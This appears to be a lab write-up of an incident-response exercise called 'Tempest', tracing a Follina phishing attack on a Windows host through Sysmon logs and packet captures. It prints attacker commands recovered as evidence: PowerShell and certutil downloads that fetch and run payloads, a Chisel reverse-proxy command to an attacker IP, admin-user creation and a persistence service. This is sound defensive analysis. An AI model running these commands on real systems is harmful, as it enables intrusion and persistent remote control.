# Incident Report - Tempest

## Overview
**Environment:** Windows Workstation 

**Captured Artefacts:** 'capture.pcapng' (Captured Network Traffic), 'sysmon.evtx' (Sysmon Event Logs), 'windows.evtx' (Windows Event Logs)

**Tools Used:** Event Viewer, Sysmon, Timeline Explorer, SysmonView, Wireshark

**Objective:** Analyze the incident to develop a clean flow of how the attack was executed through, while making use of MITRE ATT&CK TTPs.

---

## Investigation

### Phase 1: Preparation
* Converted artefacts into usable formats for certain tools
  * Used EvtxEcmd to convert `sysmon.evtx` into a `.csv file`, for Timeline Explorer
  * Used Event Viewer to convert `sysmon.evtx` into an `.xml file`, for SysmonView
* Calculated hashes of the artefacts to establish integrity reference points, and ensure reproducibility
  * `capture.pcapng` hash = `CB3A1E6ACFB246F256FBFEFDB6F494941AA30A5A7C3F5258C3E63CFA27A23DC6`
  * `sysmon.evtx` hash = `665DC3519C2C235188201B5A8594FEA205C3BCBC75193363B87D2837ACA3C91F`
  * `windows.evtx` hash = `D0279D5292BC5B25595115032820C978838678F4333B725998CFE9253E186D60`

### Phase 2: Initial Access Part 1
* **Provided Information:**
  * The malicious document is a `.doc` file.
  * The file was downloaded by the user using `chrome.exe`.
  * After being downloaded, the malicious document executed a chain of commands.
 
* **Investigation Begins**
  * Based on the information provided, a search was done for `.doc` file extensions on the `sysmon.csv` file inside `Timeline Explorer`.
    * **Results:**
      * A document by the name of `free_magicules.doc` was discovered, with the PID `496`.
      * The compromised user and machine are `benimaru` and `TEMPEST` respectively.
      * The malicious domain is `hxxp://phishteam[.]xyz`.
      * The IPv4 Address resolved by the malicious domain is `167[.]71[.]199[.]191`.
      * A base64 encoded string was found, which was decoded using CyberChef:
        * Encoded: `JGFwcD1bRW52aXJvbm1lbnRdOjpHZXRGb2xkZXJQYXRoKCdBcHBsaWNhdGlvbkRhdGEnKTtjZCAiJGFwcFxNaWNyb3NvZnRcV2luZG93c1xTdGFydCBNZW51XFByb2dyYW1zXFN0YXJ0dXAiOyBpd3IgaHR0cDovL3BoaXNodGVhbS54eXovMDJkY2YwNy91cGRhdGUuemlwIC1vdXRmaWxlIHVwZGF0ZS56aXA7IEV4cGFuZC1BcmNoaXZlIC5cdXBkYXRlLnppcCAtRGVzdGluYXRpb25QYXRoIC47IHJtIHVwZGF0ZS56aXA7Cg==`
        * Decoded:
          `$app=[Environment]::GetFolderPath('ApplicationData');cd "$app\Microsoft\Windows\Start Menu\Programs\Startup"; iwr hxxp://phishteam[.]xyz/02dcf07/update.zip -outfile update.zip; Expand-Archive .\update.zip -DestinationPath .; rm update.zip;`
      * After observing parent-child relationship between WINWORD.EXE and the process that executed the payload (msdt.exe), the attack was suspected to be `Follina` with the CVE number `CVE-2022-30190`

### Phase 3: Execution
* **Provided Information:**
  * The document successfully executed a base64 command.
  * Decoding the base64 string reveals the command chain.

* **Investigation Continues**
  * The base64 command revealed that a file was written on the system with the file path of `C:\Users\benimaru\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup`
  * It was discovered that once the user logs onto the machine, a command is set to run to download a file titled `first.exe`: `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -noni certutil -urlcache -split -f 'hxxp://phishteam[.]xyz/02dcf07/first.exe' C:\Users\Public\Downloads\first.exe; C:\Users\Public\Downloads\first.exe`
    * `first.exe` SHA256 hash: `CE278CA242AA2023A4FE04067B0A32FBD3CA1599746C160949868FFC7FC3D7D8`
  * After investigating the discovered `first.exe` binary, it was discovered that it establishes a connection to a C2 server, the domain and port used by the attacker are: `resolvecyber[.]xyz:80`

### Phase 4: Command and Control
* **Investigation Continues**
  * Using Wireshark and the provided `capture.pcapng` pcap file, and after investigating HTTP traffic, the following URL was found to be embedded in the malicious document: `hxxp://phishteam[.]xyz/02dcf07/index.html`
  * The attacker used base64 encoding, and the `q` parameter in the C2 connection to send the payload.
  * The specific URL the attacker used in the domain `resolvecyber[.]xyz` to retrieve the command to be executed was: `/9ab62b5`
  * The binary makes use of the `GET` HTTP method.
  * The attacker used the `nim` language to compile the binary.
 
### Phase 5: Discovery, Credential Access
* **Investigation Continues**
* After going through more encoded commands that were executed by the attacker, it was discovered that the attacker had found sensitive information such as the `[REDACTED]` user password,  via a powershell scripted titled `automation.ps1`.
* The attacker had enumerated the listening ports inside the machine, and utilized the port `5985` (WinRM) to establish a remote shell connection.
* After enumerating the listening ports, the attacker established a reverse socks proxy for access to the internal services inside the machine using the following command: `C:\Users\benimaru\Downloads\ch.exe client 167.71.199.191:8080 R:socks`
  * Hash of binary `ch.exe`: `8A99353662CCAE117D2BB22EFD8C43D7169060450BE413AF763E8AD7522D2451`
* After utilizing some OSINT (VirusTotal) on the hash above, it was discovered that the attacker made use of the tool `Chisel`.
* The attacker then used the previously mentioned `WinRM` tied to the port `5985` to authenticate and interact with the system.

### Phase 6: Privilege Escalation
* **Investigation Continues**
* The attacker proceeded to download another binary, titled `spf.exe`, for privilege escalation.
  * Hash of binary `spf.exe`: `8524FBC0D73E711E69D60C64F1F1B7BEF35C986705880643DD4D5E17779E586D`
* Using OSINT (VirusTotal) on the binary above revealed the tool to be `PrintSpoofer`. This tool is used to escalate the user's privileges to `NT AUTHORITY/SYSTEM`
* The attacker used `PrintSpoofer` to exploit a specific privilege owned by the user, `SeImpersonatePrivilege`, for privilege escalation.
* The attacker executed the `PrintSpoofer` tool with another binary, titled `final.exe`, to establish a C2 connection over the port `8080`.

### Phase 7: Action on Objectives
* **Investigation Continues**
* After gaining administrative privileges, the attacker created two users `shion` and `shuna`, likely to establish persistence.
  * Detected via Event ID `4720`
* The attacker proceeded to attempt to add one of the users they created, `shion` to the administrators group.
  * Command used by the attacker: `net localgroup administrators /add shion`
  * Event ID: `4732`
* Finally, the user executed a command to establish permanent persistence on the compromised machine via the command:
  * `C:\Windows\system32\sc.exe \\TEMPEST create TempestUpdate2 binpath= C:\ProgramData\final.exe start= auto`
